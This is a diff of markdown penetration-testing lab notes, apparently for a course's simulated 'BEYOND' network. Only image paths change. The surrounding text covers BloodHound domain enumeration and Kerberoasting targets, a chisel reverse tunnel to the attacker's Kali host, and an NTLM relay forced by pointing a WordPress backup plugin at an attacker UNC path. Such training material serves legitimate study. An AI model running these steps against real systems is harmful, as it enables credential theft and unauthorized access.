@@ -144,13 +144,13 @@ This is not surprising given the hostname, MAILSRV1.
 We may not be familiar with hMailServer, so we can research it.  It's web page states it's a free open source email server for MS Windows.
 
 We can search for CVEs and public exploits, but as Namp did not discover the version number we need to conduct a broader search, which only turns up older results in this case.
-<!-- ![99684678161d6071a40af92148e6bb39.png](../_resources/99684678161d6071a40af92148e6bb39.png) -->
+<!-- ![99684678161d6071a40af92148e6bb39.png](assets/static/resources/99684678161d6071a40af92148e6bb39.png) -->
 
 *Even if we had found a vulnerability with a matching exploit providing the code execution, we should not skip the remaining enumeration steps. While we may get access to the target system, we could potentially miss out on vital data or information for other services and systems.*
 
 
 Next we enum the IIS web server, start by browsing to the page.
-![4316651448cd222db1ee56d6a44fcad9.png](../_resources/4316651448cd222db1ee56d6a44fcad9.png)
+![4316651448cd222db1ee56d6a44fcad9.png](assets/static/resources/4316651448cd222db1ee56d6a44fcad9.png)
 - We find only the default IIS welcome page.
 
 Let's use `gobuster` to try to enum directories and files.  Enter `dir` to use the directory enumeration mode, `-u` for URL, `-w` for wordlist, and `-x` for the files types we want to identify.  In this case, we will look for `txt,pdf,config` to identify any documents or config files.  Use `-o` to create an output file.
@@ -229,11 +229,11 @@ We are only able to perform a password attack on port 22, but we don't have any 
 *We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer. As this will yield no actionable results, we'll skip it.*
 
 We begin by browsing to the webpage, the Nmap scan returned the HTTP title BEYOND Finance so we should find a non-default page.
-![d79fb1b122967e1df5ccb258d137ff91.png](../_resources/d79fb1b122967e1df5ccb258d137ff91.png)
+![d79fb1b122967e1df5ccb258d137ff91.png](assets/static/resources/d79fb1b122967e1df5ccb258d137ff91.png)
 - We find a basic company web page.
 
 At first glance there is no menu bar and there doesn't appear to be anything actionable.  Let's inspect the page source code to determine the underlying technology.  We can find artifacts and strings indicating the framework, solution, or CMS in use.
-![d8a98d80dbe4df24409b0e83009ec511.png](../_resources/d8a98d80dbe4df24409b0e83009ec511.png)
+![d8a98d80dbe4df24409b0e83009ec511.png](assets/static/resources/d8a98d80dbe4df24409b0e83009ec511.png)
 
 The presence of strings "wp-content" and "wp-include" indicate the site is running WordPress.  We can confirm by using `whatweb`.
 ```bash
@@ -1371,7 +1371,7 @@ Let's build a raw query to display all systems the collector identified:
 ```
 MATCH (m:Computer) RETURN m
 ```
-![e53a91823062abad4be1695b133c19cc.png](../_resources/e53a91823062abad4be1695b133c19cc.png)
+![e53a91823062abad4be1695b133c19cc.png](assets/static/resources/e53a91823062abad4be1695b133c19cc.png)
 - We have 4 computer objects in the domain.
  - Click on the nodes to obtain additional info about the computer objects.
 ```
@@ -1412,7 +1412,7 @@ MARCUS
 To use some of BloodHound's pre-built queries we can mark `marcus` (interactive shell) and `john` (valid creds) as owned.  Right click on the respective objects and mark as "Owned".
 
 Display all domain admins with the pre-built "Find all Domain Admins" query under "Analysis".
-![efde744e9c60c759469cce9b069cc86d.png](../_resources/efde744e9c60c759469cce9b069cc86d.png)
+![efde744e9c60c759469cce9b069cc86d.png](assets/static/resources/efde744e9c60c759469cce9b069cc86d.png)
 - Aside from `Administrator`, `beccy` is a member of Domain Admins group.
 
 *In a real penetration test, we should also examine domain groups and GPOs. Enumerating both is often a powerful method to elevate our privileges in the domain or gain access to other systems. For this simulated penetration test, we'll skip these two enumeration steps as they provide no additional value for this environment.*
@@ -1442,7 +1442,7 @@ The relationship for this case is `[:HasSession]`, the first node specified by a
 ```
 MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 ```
-![3bfbfb23582551875d2c6cf2272f53c9.png](../_resources/3bfbfb23582551875d2c6cf2272f53c9.png)
+![3bfbfb23582551875d2c6cf2272f53c9.png](assets/static/resources/3bfbfb23582551875d2c6cf2272f53c9.png)
 - Our query shows 3 active sessions.
 	- CLIENTWK1 has an active session with user `marcus`
   - As expected.
@@ -1454,12 +1454,12 @@ MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
   - This means local Administrator (indicated by RID 500) has an active session.
 
 The next step is to identify all *KERBEROASTABLE* users in the domain.  We can use pre-built *List all Kerberoastable Accounts* query.
-![198de7cda1a7ad2ae9f7313b564488ed.png](../_resources/198de7cda1a7ad2ae9f7313b564488ed.png)
+![198de7cda1a7ad2ae9f7313b564488ed.png](assets/static/resources/198de7cda1a7ad2ae9f7313b564488ed.png)
 - Apart from `krbtgt`, which is often an unfeasible vector, `daniela` is kerberoastable.
  - *The krbtgt user account acts as service account for the Key Distribution Center (KDC) and is responsible for encrypting and signing Kerberos tickets. When a domain is set up, a password is randomly generated for this user account, making a password attack unfeasible. Therefore, we can often safely skip krbtgt in the context of Kerberoasting.*.
 
 Examine the SPN of `daniela` in BloodHound from the Node Info menu by clicking on the node.
-![c8609f1c2ae1777f3b7df679d8ac340b.png](../_resources/c8609f1c2ae1777f3b7df679d8ac340b.png)
+![c8609f1c2ae1777f3b7df679d8ac340b.png](assets/static/resources/c8609f1c2ae1777f3b7df679d8ac340b.png)
 - The mapped SPN is `http/internalsrv1.beyond.com`
  - We can infer that a web server is running.
  - Once we've performed Kerberoasting and possibly obtained a cleartext password for `daniela` we may use it to access INTERNALSRV1.
@@ -1669,11 +1669,11 @@ chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
 ```
 - With chisel connected wr can browse to port 80 on 172.16.87.241 via port 81 of Kali localhost with Firefox.
 
-![b8f0104d9ecbbe285ea8dbfc861a4ad1.png](../_resources/b8f0104d9ecbbe285ea8dbfc861a4ad1.png)
+![b8f0104d9ecbbe285ea8dbfc861a4ad1.png](assets/static/resources/b8f0104d9ecbbe285ea8dbfc861a4ad1.png)
 - We find an internal wordpress instance on INTERNALSRV1.
 
 Browse to the login page at `http://127.0.0.1/wordpress/wp-admin` and try to log in with the creds we discovered.
-![997c101adee6da93803ce658c1d73f40.png](../_resources/997c101adee6da93803ce658c1d73f40.png)
+![997c101adee6da93803ce658c1d73f40.png](assets/static/resources/997c101adee6da93803ce658c1d73f40.png)
 - The nav bar shows a redirect to `internalsrv1.beyond.com`
  - Indicating a DNS name set within the domain.
 
@@ -1692,7 +1692,7 @@ ff02::2 ip6-allrouters
 ```
 
 We can now access `/wp-admin`.
-![dfacbae52347802d192b900c12b52cf8.png](../_resources/dfacbae52347802d192b900c12b52cf8.png)
+![dfacbae52347802d192b900c12b52cf8.png](assets/static/resources/dfacbae52347802d192b900c12b52cf8.png)
 - We try to log in with the creds we gathered so far as well as common pairs.
  - I.e.- `admin:admin`
 - No joy.
@@ -1819,7 +1819,7 @@ Stopped: Sat Dec 30 15:33:10 2023
  - *We already established that no domain user has local Administrator privileges on any domain computers and we cannot use RDP to log in to them. However, we may be able to use protocols such as WinRM to access other systems.*.
 
 Now we can try to login at `/wp-admin` through our port forward.
-![a0951af7b0c0bfb3363dd87066037791.png](../_resources/a0951af7b0c0bfb3363dd87066037791.png)
+![a0951af7b0c0bfb3363dd87066037791.png](assets/static/resources/a0951af7b0c0bfb3363dd87066037791.png)
 - We have successfully gained access to the WP instance as `daniela`
 
 ##### Abuse a WordPress Plugin for a Relay Attack
@@ -1827,18 +1827,18 @@ Now we can try to login at `/wp-admin` through our port forward.
 Now that we have gained access to the WP dashboard, we can review the settings and plugins.
 
 Starting with users:
-![f0c632ee39f8ec64b00ab95e0be57f1d.png](../_resources/f0c632ee39f8ec64b00ab95e0be57f1d.png)
+![f0c632ee39f8ec64b00ab95e0be57f1d.png](assets/static/resources/f0c632ee39f8ec64b00ab95e0be57f1d.png)
 - `daniela` is the only user.
 
 Next we check `Settings > General`.
-![dfd3fcb0364a49d682aec56dd1600725.png](../_resources/dfd3fcb0364a49d682aec56dd1600725.png)
+![dfd3fcb0364a49d682aec56dd1600725.png](assets/static/resources/dfd3fcb0364a49d682aec56dd1600725.png)
 
 The WordPress Address (URL) and Site Address (URL) are DNS names as we had assumed.  All other settings are mostly default, so we review installed plugins.
-![56a327be48cfed2c102b96750338e2ca.png](../_resources/56a327be48cfed2c102b96750338e2ca.png)
+![56a327be48cfed2c102b96750338e2ca.png](assets/static/resources/56a327be48cfed2c102b96750338e2ca.png)
 - Of the 3 plugins only [Backup Migration](https://wordpress.org/plugins/backup-backup/)
  - Click "Manage".
   - Clicking through menus and settings we disconver the Backup dir path.
-![49be3d5c8c95f88a7e90070eaf12a73a.png](../_resources/49be3d5c8c95f88a7e90070eaf12a73a.png)
+![49be3d5c8c95f88a7e90070eaf12a73a.png](assets/static/resources/49be3d5c8c95f88a7e90070eaf12a73a.png)
 - Backup path `C:\xampp\htdocs\wordpress\wp-content\backup-migration-BV1emzfHrI`
  - We can enter a path in this field, we may be able to abuse this functionality to force auth of the underlying system.
 
@@ -1925,7 +1925,7 @@ listening on [any] 9999 ...
 With everything setup we can modify the Backup directory path.
 
 Set the path to the URI reference `//192.168.45.163/test` where the IP is our Kali machine and `/test` is a nonexistent path.
-![156b67d1d13a6a7b87d4587904efcffa.png](../_resources/156b67d1d13a6a7b87d4587904efcffa-1.png)
+![156b67d1d13a6a7b87d4587904efcffa.png](assets/static/resources/156b67d1d13a6a7b87d4587904efcffa-1.png)
 - Once entered scroll down and click Save.
  - This causes the WP plugin to auth to our `impacket-ntlmrelayx` in the context of the user running WP.
 
